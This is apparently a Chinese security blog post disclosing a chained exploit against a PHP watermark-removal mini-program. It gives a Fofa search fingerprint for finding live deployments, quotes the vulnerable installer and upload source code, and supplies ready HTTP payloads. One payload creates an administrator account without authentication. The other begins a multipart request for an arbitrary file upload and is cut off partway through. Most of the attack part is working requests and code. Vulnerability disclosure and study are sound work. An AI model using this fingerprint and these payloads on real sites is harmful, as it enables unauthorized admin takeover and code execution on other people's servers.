---
title: 某2026最新去水印小程序文件上传漏洞组合拳
url: https://mp.weixin.qq.com/s/ie-qH_iMvOmkWYFAEVQdSw
source: Doonsec's feed
date: 2026-06-16
fetch_date: 2026-06-17T07:01:21.714175
---

# 某2026最新去水印小程序文件上传漏洞组合拳

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/De3yb4u5JSof3eTy2hv9gutWIiaEljBQF2Qk4vluzYiaicQngnRyia1zjPsuib7RucOBbSVxiacSzkZ9wbwWLctVeBrOIoiaLMyNib40rjXrK1HXZo4/0?wx_fmt=jpeg)

# 某2026最新去水印小程序文件上传漏洞组合拳

原创

Mstir
Mstir

星悦安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0)

点击上方蓝字关注我们 并设为星标

## 0x00 前言

**这个小程序支持涂抹去水印，接口可以自己对接自己的，前端首页文件里面修改自己接口的返回字段即可！源码技术栈：PHP7.4  数据库：mysql**

**Fofa指纹 :"去水印小程序后台"**

![image.png](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSpjIaEeopwLbtmogphqOLL9aUftwiadOUwBrdeiakSppuiclTSzMAI7dvuSFyXjDNFmQ61o3o8twF5HaK9jTjH79DPBMOfFSm9Afs/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSqYiaUDkBUibLetofTfch3OAiczzdlg31cwU9oxic0Y4HjOPb7M2S9UzYnLKJ6AicClAxGsv5M2ULxAlGLoCtcCwSxuKCZlCibUWaCjA/640?wx_fmt=png&from=appmsg)![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSpZIRXKyMgtLC7En4rrfy4L49JHpPl8UspibiaicZWzicFKJWGRRqlcqgREd9hSjPy6FP0xcnsr4XDLaFPbW6P2QdcZ2eZ8yQU7dIE/640?wx_fmt=png&from=appmsg)

## 0x01 前台未授权创建管理员账户

**漏洞点位于 /install/index.php 中，只要**`install/`**目录仍可访问，即使系统已经安装，攻击者也可直接请求**`step=3`**分支创建新管理员账号。代码没有校验当前是否已有管理员、没有安装 token、没有会话绑定，也没有要求后台登录**

```
// 检查是否已安装（仅在没有明确进行安装步骤时跳转）$db_config_file = INSTALL_PATH . '/../config/database.php';$requested_step = isset($_GET['step']) ? intval($_GET['step']) : (isset($_POST['step']) ? intval($_POST['step']) : 1);// 若正在执行 step=3（创建管理员），不跳转，必须让用户完成设置if ($requested_step != 3 && file_exists($db_config_file)) {    $config = @include $db_config_file;    if (is_array($config) && isset($config['db']) && !empty($config['db']['name']) && !empty($config['db']['user'])) {        // 检查是否已有管理员（真正安装完成才跳转）        $admin_check_file = INSTALL_PATH . '/../config/.installed';        if (file_exists($admin_check_file)) {            header('Location: ../admin/');            exit;        }    }}$error = '';$step = isset($_GET['step']) ? intval($_GET['step']) : 1;
// 处理表单提交if ($_SERVER['REQUEST_METHOD'] === 'POST') {    $step = isset($_POST['step']) ? intval($_POST['step']) : 1;    ......      } elseif ($step == 3) {        // 创建管理员        $username = trim($_POST['username']);      $password = $_POST['password'];      $confirm_password = $_POST['confirm_password'];
      if (empty($username) || empty($password)) {        $error = '用户名和密码不能为空';      } elseif ($password !== $confirm_password) {        $error = '两次密码输入不一致';      } elseif (strlen($password) < 6) {        $error = '密码长度不能少于6位';      } else {        // 读取配置        $config = include INSTALL_PATH . '/../config/database.php';
        try {          $dsn = "mysql:host={$config['db']['host']};port={$config['db']['port']};dbname={$config['db']['name']};charset=utf8mb4";          $pdo = new PDO($dsn, $config['db']['user'], $config['db']['pass'], [                         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,                         ]);
          $salt = substr(md5(uniqid(rand(), true)), 0, 32);          $password_hash = md5(md5($password) . $salt);
          $stmt = $pdo->prepare("INSERT INTO `w_admin` (`username`, `password`, `salt`, `created_at`) VALUES (?, ?, ?, NOW())");          $stmt->execute([$username, $password_hash, $salt]);
          // 标记安装完成（避免再次进入安装时直接跳转，未设置管理员）          file_put_contents(INSTALL_PATH . '/../config/.installed', date('Y-m-d H:i:s'));
          // 跳转到后台          header('Location: ../admin/');          exit;
        } catch (PDOException $e) {          $error = '创建管理员失败: ' . $e->getMessage();        }      }      }
```

**Payload(新增管理员):**

```
POST /install/index.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencoded
step=3&username=fast&password=fast123456&confirm_password=fast123456
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSohBDNGnR81trXN5tvagp8CtNlu776MyVIv7IAc2g7NzzGX6grQub0exf9sBuKAqRVwdum3E23F7786jUj1cWGdoNlENEG95RE/640?wx_fmt=png&from=appmsg)

**然后直接拿着账号密码登录后台 fast | fast123456**

![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSrO6icVhHuxQ5kW1QU7xKUicMNYianm2ADKiayLfZ2gUVJpibyS8LJndic5lciadgaeicQKnJylhfj3fWJjlfLSPoJUI1lUztSk9VxZCicA/640?wx_fmt=png&from=appmsg)

## 0x02 后台任意文件上传漏洞

**此漏洞可配合前台未授权创建管理员账户来组合拳.**

**位于 /admin/course.php 中的 handleIconUpload 方法使用客户端提供的 $file['type'] 判断 MIME，且未对后缀进行限制，导致文件上传漏洞产生.**

```
<?php/** * 课程管理页面 */require_once ROOT_PATH . '/config/db.php';
$db = Database::getInstance();$msg = '';
// 处理文件上传function handleIconUpload($file) {    if ($file['error'] === UPLOAD_ERR_OK) {        $uploadDir = ROOT_PATH . '/uploads/course/';        if (!is_dir($uploadDir)) {            mkdir($uploadDir, 0755, true);        }
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];        $fileType = $file['type'];
        if (!in_array($fileType, $allowedTypes)) {            return ['error' => '只支持 JPG、PNG、GIF、WebP 格式的图片'];        }
        $extension = pathinfo($file['name'], PATHINFO_EXTENSION);        $newFilename = 'icon_' . time() . '_' . rand(1000, 9999) . '.' . $extension;        $targetPath = $uploadDir . $newFilename;
        if (move_uploaded_file($file['tmp_name'], $targetPath)) {            return '/uploads/course/' . $newFilename;        } else {            return ['error' => '文件上传失败'];        }    }    return null;}
// 处理表单提交 - 添加/编辑课程if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_course'])) {    $title = trim($_POST['title']);    $subtitle = trim($_POST['subtitle']);    $description = trim($_POST['description']);    $icon = trim($_POST['icon']);    $content = trim($_POST['content']);    $sort = intval($_POST['sort']);    $status = isset($_POST['status']) ? 1 : 0;
    // 处理文件上传    if (isset($_FILES['icon_file']) && $_FILES['icon_file']['error'] !== UPLOAD_ERR_NO_FILE) {        $uploadResult = handleIconUpload($_FILES['icon_file']);        if (is_array($uploadResult) && isset($uploadResult['error'])) {            $msg = $uploadResult['error'];        } elseif ($uploadResult) {            $icon = $uploadResult;        }    }
    if (empty($msg)) {        if (empty($title)) {            $msg = '课程标题不能为空';        } else {            $course_id = isset($_POST['course_id']) ? intval($_POST['course_id']) : 0;
            if ($course_id > 0) {                // 更新课程                $db->update('w_course', [                    'title' => $title,                    'subtitle' => $subtitle,                    'description' => $description,                    'icon' => $icon,                    'content' => $content,                    'sort' => $sort,                    'status' => $status                ], 'id = ?', [$course_id]);                $msg = '课程更新成功！';            } else {                // 添加课程                $db->insert('w_course', [                    'title' => $title,                    'subtitle' => $subtitle,                    'description' => $description,                    'icon' => $icon,                    'content' => $content,                    'sort' => $sort,                    'status' => $status,                    'count' => 0,                    'created_at' => date('Y-m-d H:i:s')                ]);                $msg = '课程添加成功！';            }
            // 记录日志            $db->insert('w_use_log', [                'type' => 'course',                'content' => $course_id > 0 ? '更新课程: ' . $title : '添加课程: ' . $title,                'ip' => $_SERVER['REMOTE_ADDR'] ?? '',                'created_at' => date('Y-m-d H:i:s')            ]);        }    }}
```

**Payload:**

```
POST /admin/?action=course HTTP/1.1Host: 127.0.0.1Content-Length: 404Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundary24LEG5fdzcWBLdCHAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cookie: a8c4ed34e706ef9c01b4fa71bead4d4a=ozb7freznaMBUJ0zKBBiM_85OnuLvbQsXBHH-I-a1mU.KM2yn7au4...